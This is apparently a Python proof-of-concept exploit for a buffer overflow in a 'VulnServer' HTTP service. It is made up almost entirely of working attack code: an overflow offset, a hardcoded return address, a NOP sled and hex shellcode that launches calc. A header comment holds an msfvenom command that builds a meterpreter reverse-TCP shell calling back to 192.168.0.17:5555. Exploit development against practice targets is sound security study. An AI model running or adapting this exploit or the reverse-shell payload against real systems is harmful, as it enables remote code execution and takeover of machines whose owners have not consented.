#!/usr/bin/python
#VulnServer-14-02-2019-POC
#msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.0.17 LPORT=5555 -v shellcode  -b '\x00\n\r\XFF' -i 5  -f python EXITFUNC=process
#@sasaga92


import socket
import struct
import random
import string

def pattern_create(_type,_length):
  _type = _type.split(" ")

  if _type[0] == "trash":
    return _type[1] * _length
  elif _type[0] == "random":
    return ''.join(random.choice(string.lowercase) for i in range(_length))
  elif _type[0] == "pattern":
    _pattern = ''
    _parts = ['A', 'a', '0']
    while len(_pattern) != _length:
      _pattern += _parts[len(_pattern) % 3]
      if len(_pattern) % 3 == 0:
        _parts[2] = chr(ord(_parts[2]) + 1)
        if _parts[2] > '9':
          _parts[2] = '0'
          _parts[1] = chr(ord(_parts[1]) + 1)
          if _parts[1] > 'z':
            _parts[1] = 'a'
            _parts[0] = chr(ord(_parts[0]) + 1)
            if _parts[0] > 'Z':
              _parts[0] = 'A'
    return _pattern
  else:
    return "Not Found"


def pwned(_host, _port, _payload):
	print "[*] Conectandose a {0}:{1}...".format(_host, _port)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((_host, _port))
	print "[*] Conectado, Enviando payload {0} bytes...".format(len(_payload))
	_payload = "{0}HTTP/1.1\r\n\r\n".format(_payload, _host)
	s.send(_payload)
	s.shutdown
	s.close
	print "[+] Payload de {0} bytes Enviado, Satisfactoriamente su payload ejecutado.".format(len(_payload))


def main():
	_host = "127.0.0.1"
	_port = 8080
	_offset_eip = 504
	_eip = struct.pack("<L",0x10012A5F)#10012A5F push esp # and al, 10h # mov [edx], eax # mov eax, 3 # retn crtdll.dll 5 -4 imm-to-reg, reg-to-mem, one-reg, bit, stack eax, al eax, al, esp nonull, ascii
	_nops = "\x90" * 20
	
	_shellcode = ("\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
	        "\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
	        "\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
	        "\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
	        "\x57\x78\x01\xc2\x8b\x7a\x20\x01"
	        "\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
	        "\x45\x81\x3e\x43\x72\x65\x61\x75"
	        "\xf2\x81\x7e\x08\x6f\x63\x65\x73"
	        "\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
	        "\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
	        "\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
	        "\xb1\xff\x53\xe2\xfd\x68\x63\x61"
	        "\x6c\x63\x89\xe2\x52\x52\x53\x53"
	        "\x53\x53\x53\x53\x52\x53\xff\xd7")

	_inject = pattern_create("trash A",_offset_eip)
	_inject += _eip
	_inject += _nops
	_inject += _shellcode

	print _inject
	pwned(_host,_port,_inject)

if __name__ == "__main__":
    main()
